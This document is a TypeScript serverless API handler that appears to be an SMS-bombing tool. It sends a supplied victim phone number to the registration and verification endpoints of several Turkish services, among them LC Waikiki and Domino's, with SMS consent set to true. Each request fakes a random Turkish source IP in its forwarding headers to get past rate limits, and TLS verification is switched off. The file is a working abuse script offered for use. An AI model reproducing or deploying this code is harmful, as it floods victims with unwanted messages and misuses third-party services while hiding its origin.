// @ts-nocheck
import type { VercelRequest, VercelResponse } from '@vercel/node';

// SSL Bypass - Olmazsa olmazımız
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const getRandomTurkishIP = () => {
  const blocks = [
    [88, 224, 255], [85, 96, 111], [176, 216, 223], [195, 174, 175], [94, 54, 55]
  ];
  const block = blocks[Math.floor(Math.random() * blocks.length)];
  return `${block[0]}.${Math.floor(Math.random() * (block[2] - block[1] + 1)) + block[1]}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
};

const formatPhone = (p: string) => {
  const raw = p.replace(/\D/g, '');
  return {
    raw: raw.startsWith('90') ? raw.substring(2) : (raw.startsWith('0') ? raw.substring(1) : raw),
    with90: raw.startsWith('90') ? raw : (raw.startsWith('0') ? '9' + raw : '90' + raw),
    with0: raw.startsWith('90') ? '0' + raw.substring(2) : (raw.startsWith('0') ? raw : '0' + raw),
  };
};

export default async function handler(req: VercelRequest, res: VercelResponse) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');

  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    let body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
    if (!body.serviceUrl) return res.status(400).json({ error: 'Missing URL' });

    const phones = formatPhone(body.targetPhone || '5555555555');
    const serviceId = (body.serviceId || '').toLowerCase();
    const email = body.email || 'dumenci@gmail.com';
    let targetUrl = body.serviceUrl.trim();
    if (!/^https?:\/\//i.test(targetUrl)) targetUrl = 'https://' + targetUrl;

    let payload = {};

    // LC WAIKIKI ÖZEL SNIPER
    if (serviceId.includes('lc_waikiki')) {
        payload = {
            RegisterFormView: {
                RegisterPhoneNumber: `${phones.raw.slice(0, 3)} ${phones.raw.slice(3, 6)} ${phones.raw.slice(6, 8)} ${phones.raw.slice(8, 10)}`,
                RegisterEmail: email,
                Password: "Password123!",
                PhoneAreaCode: "0090",
                IsMemberPrivacyRequired: true,
                IsSmsChecked: true,
                IsEmailChecked: false,
                IsCallChecked: false,
                ActivationCode: "",
                CaptchaCode: "",
                Referer: null
            }
        };
    } 
    else if (serviceId.includes('kahve')) payload = { countryCode: "90", phoneNumber: phones.raw };
    else if (serviceId.includes('english')) payload = { Phone: phones.with0, Source: "WEB" };
    else if (serviceId.includes('file')) payload = { mobilePhoneNumber: phones.with90 };
    else if (serviceId.includes('dominos')) payload = { mobilePhone: phones.raw, isSure: true };
    else payload = { phone: phones.raw, mobile: phones.raw };

    const fakeIP = getRandomTurkishIP();
    const headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      'Content-Type': 'application/json',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'X-Requested-With': 'XMLHttpRequest',
      'X-Forwarded-For': fakeIP,
      'X-Real-IP': fakeIP
    };

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 12000);

    try {
        const response = await fetch(targetUrl, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(timeout);

        const responseText = await response.text();
        return res.status(200).json({
            reachable: true,
            ok: response.ok,
            status: 200,
            upstreamStatus: response.status,
            serviceId: body.serviceId,
            error: response.ok ? null : `Status: ${response.status}`
        });
    } catch (fetchErr: any) {
        clearTimeout(timeout);
        return res.status(200).json({ ok: false, status: 500, error: fetchErr.message });
    }
  } catch (error: any) {
    return res.status(500).json({ error: error.message });
  }
}